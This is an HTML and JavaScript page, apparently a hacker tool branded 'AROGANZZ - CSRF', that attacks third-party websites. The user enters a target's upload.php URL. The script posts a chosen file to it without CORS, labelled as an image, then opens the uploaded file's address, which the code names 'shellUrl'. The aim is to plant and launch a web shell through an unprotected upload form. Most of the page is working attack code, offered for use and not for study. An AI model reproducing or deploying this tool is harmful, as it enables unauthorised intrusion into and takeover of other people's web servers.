<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>CSRF Online</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
/* DARK MODE STYLE */
body {
background: #000000 !important;
color: #0088ff !important;
font-family: serif;
}

.bg-light {
background: #111111 !important;
}

.card {
background: #0a0a0a !important;
border: 1px solid #0088ff !important;
box-shadow: 0 0 15px rgba(0, 136, 255, 0.3) !important;
}

.card-header {
background: linear-gradient(45deg, #001122, #002244) !important;
border-bottom: 2px solid #0088ff !important;
color: #0088ff !important;
text-shadow: 0 0 10px #0088ff;
letter-spacing: 1px;
}

.form-label {
color: #0088ff !important;
font-weight: bold;
}

.form-control {
background: #001122 !important;
border: 1px solid #0088ff !important;
color: #0088ff !important;
box-shadow: 0 0 5px rgba(0, 136, 255, 0.2);
}

.form-control::placeholder {
color: #0066cc !important;
opacity: 0.7;
}

.form-control:focus {
background: #002244 !important;
border-color: #00aaff !important;
box-shadow: 0 0 10px rgba(0, 170, 255, 0.5) !important;
color: #00aaff !important;
}

.btn-primary {
background: linear-gradient(45deg, #003366, #0088ff) !important;
border: 1px solid #0088ff !important;
color: #ffffff !important;
font-weight: bold;
text-shadow: 0 0 5px #0088ff;
box-shadow: 0 0 10px rgba(0, 136, 255, 0.4);
}

.btn-primary:hover {
background: linear-gradient(45deg, #0088ff, #00aaff) !important;
border-color: #00aaff !important;
box-shadow: 0 0 15px rgba(0, 170, 255, 0.6);
transform: translateY(-1px);
}

.btn-success {
background: linear-gradient(45deg, #004422, #00ff88) !important;
border: 1px solid #00ff88 !important;
color: #000000 !important;
font-weight: bold;
box-shadow: 0 0 10px rgba(0, 255, 136, 0.4);
}

.btn-success:hover {
background: linear-gradient(45deg, #00ff88, #00ffcc) !important;
border-color: #00ffcc !important;
box-shadow: 0 0 20px rgba(0, 255, 204, 0.6);
}

.text-danger {
color: #ff0066 !important;
text-shadow: 0 0 5px #ff0066;
}

.text-success {
color: #00ff88 !important;
text-shadow: 0 0 5px #00ff88;
}

.text-warning {
color: #ffaa00 !important;
text-shadow: 0 0 5px #ffaa00;
}

.text-info {
color: #00aaff !important;
text-shadow: 0 0 5px #00aaff;
}

footer {
background: #001122 !important;
border-top: 1px solid #0088ff !important;
color: #0088ff !important;
text-shadow: 0 0 5px #0088ff;
}

/* CUSTOM SCROLLBAR */
::-webkit-scrollbar {
width: 10px;
background: #001122;
}

::-webkit-scrollbar-thumb {
background: linear-gradient(#0088ff, #0066cc);
border-radius: 5px;
}

::-webkit-scrollbar-thumb:hover {
background: linear-gradient(#00aaff, #0088ff);
}

.glow {
animation: glow 2s ease-in-out infinite alternate;
}

@keyframes glow {
from {
text-shadow: 0 0 5px #0088ff, 0 0 10px #0088ff;
}
to {
text-shadow: 0 0 10px #0088ff, 0 0 20px #0088ff, 0 0 30px #0066cc;
}
}

/* STATUS BOX STYLE */
#status {
background: rgba(0, 34, 68, 0.7);
border: 1px solid #0088ff;
border-radius: 5px;
padding: 10px;
margin: 10px 0;
min-height: 60px;
}

/* INPUT FILE CUSTOM */
input[type="file"]::file-selector-button {
background: linear-gradient(45deg, #003366, #0088ff) !important;
border: 1px solid #0088ff !important;
color: #ffffff !important;
padding: 5px 10px;
border-radius: 3px;
cursor: pointer;
}

input[type="file"]::file-selector-button:hover {
background: linear-gradient(45deg, #0088ff, #00aaff) !important;
border-color: #00aaff !important;
}
</style>
</head>
<body class="bg-light d-flex flex-column min-vh-100">

<div class="container my-5 flex-grow-1">
<div class="card shadow-lg border-0 rounded-3 mx-auto" style="max-width: 600px;">
<div class="card-header bg-primary text-white fw-bold text-center glow">
‚ö° AROGANZZ - CSRF ‚ö°
</div>
<div class="card-body">
<form id="csrfForm" method="POST" enctype="multipart/form-data">

<!-- URL Input -->
<div class="mb-3">
<label for="url" class="form-label">üåê URL Target</label>
<input type="text" class="form-control" id="url" name="url" placeholder="http://www.target.com/[path]/upload.php" required>
</div>

<!-- POST FILE Input -->
<div class="mb-3">
<label for="fileField" class="form-label">üìÅ POST File Field</label>
<input type="text" class="form-control" id="fileField" value="file" placeholder="file / upload / filedata">
</div>

<!-- Lock Target Button -->
<div class="d-grid">
<button type="button" class="btn btn-primary fw-bold" onclick="lockTarget()">
üîí Lock Website Target
</button>
</div>

<!-- Status Box -->
<div class="mt-3 text-center" id="status"></div>

<!-- File Actions -->
<div class="mt-4 text-center" id="fileActions" style="display:none;">
<input type="file" class="form-control d-inline-block w-auto mb-2" id="fileInput">
<button type="button" class="btn btn-success ms-2 fw-bold" onclick="uploadFile()">
üöÄ Start!
</button>
</div>

</form>
</div>
</div>
</div>

<footer class="bg-dark text-white text-center py-3 mt-auto">
<small>¬© Copyright 2025 | 4R0G4NZZ:@404</small>
</footer>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>

<script>
let targetUrl = '';
let fileFieldName = 'file';

function lockTarget() {
targetUrl = document.getElementById('url').value.trim();
fileFieldName = document.getElementById('fileField').value.trim() || 'file';

if (!targetUrl) {
alert("‚ö†Ô∏è Masukkan URL target!");
return;
}

fetch(targetUrl, { method: 'HEAD', mode: 'no-cors' })
.then(() => {
document.getElementById('status').innerHTML = 
`<span class="text-danger fw-bold">${targetUrl}</span><br>Status ‚Üí <span class="text-success fw-bold">üîí Locked</span>`;
document.getElementById('fileActions').style.display = "block";
})
.catch(() => {
document.getElementById('status').innerHTML = 
`<span class="text-danger fw-bold">${targetUrl}</span><br>Status ‚Üí <span class="text-warning fw-bold">‚ö†Ô∏è CORS Restricted (Try Anyway)</span>`;
document.getElementById('fileActions').style.display = "block";
});
}

function uploadFile() {
const fileInput = document.getElementById('fileInput');

if (!fileInput.files.length) {
alert("‚ö†Ô∏è Pilih file dulu!");
return;
}

const formData = new FormData();
formData.append(fileFieldName, fileInput.files[0]);
formData.append('submit', 'Upload');
formData.append('type', 'image');

document.getElementById('status').innerHTML += 
"<br><span class='text-info'>üì§ Uploading file...</span>";

fetch(targetUrl, {
method: 'POST',
body: formData,
mode: 'no-cors'
})
.then(() => {
document.getElementById('status').innerHTML += 
"<br><span class='text-success'>‚úÖ File uploaded (check manually)</span>";

setTimeout(() => {
const shellUrl = targetUrl.replace('upload.php', fileInput.files[0].name)
.replace('upload', fileInput.files[0].name);
window.open(shellUrl, '_blank');
}, 2000);
})
.catch(error => {
document.getElementById('status').innerHTML += 
`<br><span class='text-danger'>‚ùå Upload failed: ${error}</span>`;
});
}
</script>
</body>

</html>
